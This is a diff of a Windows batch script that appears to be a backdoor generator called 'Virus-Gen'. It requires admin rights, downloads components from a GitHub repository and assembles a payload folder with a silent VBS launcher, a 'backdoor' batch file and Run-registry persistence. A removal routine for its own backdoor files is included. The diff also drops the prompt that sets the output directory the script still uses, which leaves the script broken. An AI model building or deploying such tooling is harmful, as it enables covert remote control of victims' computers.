@@ -1,48 +1,40 @@
-:: startup
-  :: setup
-    :start
-    @ECHO OFF
-    set temp=0&set payload_is_exist=0&set cmd_is_exist=0&set control_is_exist=0&color 0F&set reg_value_exists=0&set target_software_bypass=true
-    set update_number=V3.33.24
-    set dev=0
-    title unstable Release %update_number%
-    cls
-  :: enter full screen
-    :VBSDynamicBuild
-    set TempVBSFile=C:\Users\%username%\AppData\Local\Temp\~tmpSendKeysTemp.vbs
-    if exist "%TempVBSFile%" del /F /Q "%TempVBSFile%"
-    echo Set WshShell = WScript.CreateObject("WScript.Shell") >"%TempVBSFile%"
-    echo Wscript.Sleep 900                                    >>"%TempVBSFile%"
-    echo WshShell.SendKeys "{F11}"                            >>"%TempVBSFile%
-    echo Wscript.Sleep 900                                    >>"%TempVBSFile%"
-    cscript //nologo "%TempVBSFile%"
-    cls
-  :: setup checks
-    :: bypass dev lock if user is owner
-      if %username% equ 61481 goto skip_dev
-      if %username% neq luken if %dev% equ 1 goto dev
-      :skip_dev
-    :: goto check admin perms
-      goto CP
-      :adminyes
-    :: check update logs
-      if exist C:\ProgramData\UPnum.sav (call :update_check) else (goto UPcreate)
-      :UPnxt
-    :: check if git is installed
-      git version >git.sav
-      >nul find "version" git.sav && (
-        goto GIT_check_nxt
-      ) || (
-        goto error1
-      )
-      :GIT_check_nxt
-      del git.sav
-    :: check and load saved email data
-      if exist C:\ProgramData\GVGemail.sav (goto load_email) else (goto error2)
-      :emailnext
-    :: built in anti-virus check
-      if exist "C:\Users\%username%\launch.vbs" goto backdoor_remove
-      :no_remove_backdoor
+:: setup
+:start
+@ECHO OFF
+set update_number=V3.33.25
+set dev=0
+cls
+:VBSDynamicBuild
+SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
+IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
+ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
+ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
+ECHO WshShell.SendKeys "{F11}"                            >>"%TempVBSFile%
+ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
+CSCRIPT //nologo "%TempVBSFile%"
+set temp=0&set payload_is_exist=0&set cmd_is_exist=0&set control_is_exist=0&color 0F&set reg_value_exists=0&set target_software_bypass=true
+title unstable Release %update_number%
+cls
+if %username% equ 61481 goto skip_dev
+if %username% neq luken if %dev% equ 1 goto dev
+:skip_dev
+goto CP
+:adminyes
+if exist C:\ProgramData\UPnum.sav (call :update_check) else (goto UPcreate)
+:UPnxt
+git version >git.sav
+>nul find "version" git.sav && (
+  goto GIT_check_nxt
+) || (
+  goto error1
+)
+:GIT_check_nxt
+del git.sav
+:: detect and load save file data
+if exist C:\ProgramData\GVGemail.sav (goto load_email) else (goto error2)
+:emailnext
+if exist "C:\Users\%username%\launch.vbs" goto backdoor_remove
+:no_remove_backdoor
 :: manual configuration
   echo current version: %update_number%
   echo.
@@ -55,11 +47,9 @@
   echo.  
   echo DO NOT USE SPACES, replace them with _
   echo.
-  set /p opt1=Device name: 
+  set /p opt1=Device name:
   echo where would you like to create the files
   echo if directory does not exist it will be created
-  echo.
-  set /p opt2=directory: 
 :: create all files needed
   :: create placeholder file
     Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/default_placeholder.bat").Content >%opt1%.bat
@@ -102,43 +92,27 @@
     if exist %opt2%\payload\launch.vbs (echo [92msilent launch exists[0m) else (goto error4)
     if exist %opt2%\payload\payload.bat (echo [92mbackdoor exists[0m) else (goto error6)
     if exist %opt2%\run.bat (echo [92mrun exists[0m) else (goto error7)
-
 :: delete files created during setup
   echo [33mcleaning up temp files...[0m
   if exist %opt1%.bat (set temp=1) else (echo [92mno temp files where found[0m)
   if %temp% equ 1 del %opt1%.bat
   if %temp% equ 1 echo [92mtemp files deleted[0m
-:: end prompt
-  echo.
-  echo press any key to exit...
-  pause >nul
- exit /b
-
-
-
-
-
-
-
-:: update managing
-  :: check for edits in the update logs
-    :update_check
-    < C:\ProgramData\UPnum.sav (
-      set /p UPnum=
-    )
-    if %UPnum% equ %update_number% exit /b
-  ::download the logs if they are updated
-    :UPlogs
-    echo %update_number% >C:\ProgramData\UPnum.sav
-    Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/Current-update-logs").Content >C:\ProgramData\UPlogs.txt
-    echo.
-    echo please close the text document to continue
-    start /WAIT C:\ProgramData\UPlogs.txt
-    exit /b
-  :: create save file to detect when updates are made to the logs
-    :UPcreate
-    echo %update_number% >C:\ProgramData\UPnum.sav
-    goto UPlogs
+echo.
+echo press any key to exit...
+pause >nul
+exit /b
+:update_check
+< C:\ProgramData\UPnum.sav (
+  set /p UPnum=
+)
+if %UPnum% equ %update_number% exit /b
+:UPlogs
+echo %update_number% >C:\ProgramData\UPnum.sav
+Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/Current-update-logs").Content >C:\ProgramData\UPlogs.txt
+echo.
+echo please close the text document to continue
+start /WAIT C:\ProgramData\UPlogs.txt
+exit /b
 :: errors
   :error1
     echo [31merror code: 01[0m
@@ -237,80 +211,75 @@
     echo press any key to exit...
     pause >nul
     exit /b
-:: email managing
-  :: ask user for email adress
-    :emailadd
-    set /p email=email:
-    echo %email%>C:\ProgramData\GVGemail.sav
-    if exist C:\ProgramData\GVGemail.sav (echo [92memail was successfully saved![0m) else (goto error5)
-  :: load saved email
-    goto emailnext
-    :load_email
-    < C:\ProgramData\GVGemail.sav (
-      set /p email=
+:: ask user for email adress
+:emailadd
+set /p email=email:
+echo %email%>C:\ProgramData\GVGemail.sav
+if exist C:\ProgramData\GVGemail.sav (echo [92memail was successfully saved![0m) else (goto error5)
+:: load saved email
+goto emailnext
+:load_email
+< C:\ProgramData\GVGemail.sav (
+  set /p email=
+)
+goto emailnext
+:CP
+    net session >nul 2>&1
+    if %errorLevel% == 0 (
+        goto adminyes
+    ) else (
+        goto error3
     )
-    goto emailnext
-:: check if user has admin perms
-  :CP
-      net session >nul 2>&1
-      if %errorLevel% == 0 (
-          goto adminyes
-      ) else (
-          goto error3
-      )
-:: developer only lock
-  :dev
-  echo.
-  title dissabled %update_number%
-  echo app dissabled due to development. contact though discord (guest257351#1040) for more information
-  echo.
-  echo press any key to exit...
-  pause >nul
-  exit /b
-:: built in anti-virus
-  :: ask user if they want to remove the backdoor
-    :backdoor_remove
-    echo [31mWARNING![0m
-    echo.
-    echo Program has detected that your own PC has been backdoored
-    echo would you like to remove the backdoor?
-    choice
-    if %errorlevel% equ 1 goto yes_remove_backdoor
-    if %errorlevel% equ 2 goto no_remove_backdoor
-  :: scan PC for backdoor files
-    :yes_remove_backdoor
-    echo [33mremoving backdoor files...[0m
-    echo [33mlaunch.vbs detected.[0m
-    if exist "C:\users\%username%\AppData\payload.bat" (set payload_is_exist=1)
-    if %payload_is_exist% equ 1 (echo [33mpayload.bat detected.[0m) else (echo [33mpayload.bat not detected.[0m)
-    if exist "C:\users\%username%\AppData\control" (set control_is_exist=1)
-    if %control_is_exist% equ 1 (echo [33mcontrol folder detected.[0m) else (echo [33mcontrol folder not detected.[0m)
-    if exist "C:\users\%username%\AppData\cmd.bat" (set cmd_is_exist=1)
-    if %cmd_is_exist% equ 1 (echo [33mcmd.bat detected.[0m) else (echo [33mcmd.bat not detected.[0m)
-    REG QUERY "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "payload"
-    if %errorlevel% equ 0 set reg_value_exists=1 >nul
-    if %reg_value_exists% equ true (echo regisrty value exists) else (echo registry value not detected)
-  :: remove backdoor files
-    del "C:\Users\%username%\launch.vbs"
-    if not exist "C:\Users\%username%\launch.vbs" (echo [92mlaunch.vbs removed[0m)
-    if %payload_is_exist% equ 1 del "C:\users\%username%\AppData\payload.bat /Q /F"
-    if %payload_is_exist% equ 1 (echo [92mpayload.bat removed[0m)
-    if %cmd_is_exist% equ 1 (del "C:\users\%username%\AppData\cmd.bat" /Q /F)
-    if %cmd_is_exist% equ 1 (echo [92mcmd.bat removed[0m)
-    if %control_is_exist% equ 1 (del "C:\users\%username%\AppData\control" /Q /F) 
-    if %control_is_exist% equ 1 (echo [92mcontrol folder removed[0m)
-    if %reg_value_exists% equ 1 (reg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v payload /f)>nul
-    if %reg_value_exists% equ 1 (echo [92mregisry value deleted[0m)
-    timeout 2 /NOBREAK >nul
-    goto no_remove_backdoor
-:: download and install git
-  :git_download
-  echo [33mdownloading git....[0m
-  powershell Import-Module BitsTransfer
-  powershell Start-BitsTransfer -source "https://github.com/git-for-windows/git/releases/download/v2.31.0.windows.1/Git-2.31.0-64-bit.exe" -Destination gitDL.exe
-  echo [92mgit downloaded[0m
-  timeout 1 /NOBREAK >nul
-  echo [33minstalling git...[0m
-  gitDL.exe /silent
-  del gitDL.exe
-  goto start
+:dev
+echo.
+title dissabled %update_number%
+echo app dissabled due to development. contact though discord (guest257351#1040) for more information
+echo.
+echo press any key to exit...
+pause >nul
+exit /b
+:UPcreate
+echo %update_number% >C:\ProgramData\UPnum.sav
+goto UPlogs
+:backdoor_remove
+echo [31mWARNING![0m
+echo.
+echo Program has detected that your own PC has been backdoored
+echo would you like to remove the backdoor?
+choice
+if %errorlevel% equ 1 goto yes_remove_backdoor
+if %errorlevel% equ 2 goto no_remove_backdoor
+:yes_remove_backdoor
+echo [33mremoving backdoor files...[0m
+echo [33mlaunch.vbs detected.[0m
+if exist "C:\users\%username%\AppData\payload.bat" (set payload_is_exist=1)
+if %payload_is_exist% equ 1 (echo [33mpayload.bat detected.[0m) else (echo [33mpayload.bat not detected.[0m)
+if exist "C:\users\%username%\AppData\control" (set control_is_exist=1)
+if %control_is_exist% equ 1 (echo [33mcontrol folder detected.[0m) else (echo [33mcontrol folder not detected.[0m)
+if exist "C:\users\%username%\AppData\cmd.bat" (set cmd_is_exist=1)
+if %cmd_is_exist% equ 1 (echo [33mcmd.bat detected.[0m) else (echo [33mcmd.bat not detected.[0m)
+REG QUERY "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "payload"
+if %errorlevel% equ 0 set reg_value_exists=1 >nul
+if %reg_value_exists% equ true (echo regisrty value exists) else (echo registry value not detected)
+del "C:\Users\%username%\launch.vbs"
+if not exist "C:\Users\%username%\launch.vbs" (echo [92mlaunch.vbs removed[0m)
+if %payload_is_exist% equ 1 del "C:\users\%username%\AppData\payload.bat /Q /F"
+if %payload_is_exist% equ 1 (echo [92mpayload.bat removed[0m)
+if %cmd_is_exist% equ 1 (del "C:\users\%username%\AppData\cmd.bat" /Q /F)
+if %cmd_is_exist% equ 1 (echo [92mcmd.bat removed[0m)
+if %control_is_exist% equ 1 (del "C:\users\%username%\AppData\control" /Q /F) 
+if %control_is_exist% equ 1 (echo [92mcontrol folder removed[0m)
+if %reg_value_exists% equ 1 (reg delete HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v payload /f)>nul
+if %reg_value_exists% equ 1 (echo [92mregisry value deleted[0m)
+timeout 2 /NOBREAK >nul
+goto no_remove_backdoor
+:git_download
+echo [33mdownloading git....[0m
+powershell Import-Module BitsTransfer
+powershell Start-BitsTransfer -source "https://github.com/git-for-windows/git/releases/download/v2.31.0.windows.1/Git-2.31.0-64-bit.exe" -Destination gitDL.exe
+echo [92mgit downloaded[0m
+timeout 1 /NOBREAK >nul
+echo [33minstalling git...[0m
+gitDL.exe /silent
+del gitDL.exe
+goto start
